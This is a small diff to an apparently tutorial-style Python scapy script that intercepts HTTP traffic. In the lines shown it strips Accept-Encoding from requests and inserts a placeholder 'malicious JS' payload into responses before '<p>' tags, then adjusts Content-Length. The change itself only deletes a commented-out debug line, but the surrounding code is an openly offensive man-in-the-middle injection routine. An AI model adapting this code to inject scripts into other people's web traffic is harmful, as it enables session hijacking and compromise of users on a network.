@@ -22,7 +22,6 @@ def process_packet(packet):
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            #print(scapy_packet.show())
             injection_code = 'YOUR MALICIOUS JS SCRIPT>'
             load = load.replace("<p>", injection_code + "<p>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
